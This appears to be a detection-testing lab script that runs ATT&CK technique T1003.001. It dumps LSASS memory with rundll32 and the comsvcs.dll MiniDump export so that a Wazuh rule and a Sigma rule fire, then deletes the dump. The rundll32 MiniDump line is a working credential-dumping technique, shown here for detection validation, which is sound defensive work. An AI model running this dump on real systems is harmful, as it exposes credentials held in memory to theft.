# ===========================================================================
# lsass-dump.ps1 — exercise T1003.001 (LSASS Memory) on ws-01.
#
# Dumps LSASS via the built-in comsvcs.dll MiniDump export — a pure LOLBin, so it
# runs offline with nothing to download. Run ELEVATED on ws-01:
#     powershell -ExecutionPolicy Bypass -File .\lsass-dump.ps1
#
# What it proves: it generates the telemetry two detections key on —
#   * stock Wazuh rule 92900   — Sysmon EID10 ProcessAccess to lsass.exe
#   * custom Sigma rule 100525 — the comsvcs MiniDump command line (Sysmon EID1)
#
# The catalog's original T1003.001 entry (#12) was inspection-only: LSASS PPL
# blocked a successful dump. That does NOT block the detection — Sysmon logs the
# access attempt and the command process regardless of whether the read succeeds.
# So this makes T1003.001 live-fireable where the memory-read path was not.
#
# Verify on siem-01:
#   sudo grep -E '92900|100525|100526' /var/ossec/logs/alerts/alerts.log | tail
# ===========================================================================
$ErrorActionPreference = 'Continue'

$lsass = (Get-Process lsass -ErrorAction Stop).Id
$out   = Join-Path $env:TEMP 'lsass_dump.bin'
Write-Host "[*] LSASS PID = $lsass"
Write-Host "[*] Dumping via comsvcs.dll MiniDump -> $out  (detection fires on the attempt)"

rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass $out full

if (Test-Path $out) {
    $sz = (Get-Item $out).Length
    Write-Host "[+] Dump written ($sz bytes) — LSASS PPL was NOT enforced on this host."
    Remove-Item $out -Force
    Write-Host "[*] Cleaned up the dump file."
} else {
    Write-Host "[-] No dump file — LSASS PPL blocked the read (expected on a hardened host)."
    Write-Host "    The detection still fired: the comsvcs command process + the lsass"
    Write-Host "    handle-open are both logged before PPL denies the memory read."
}
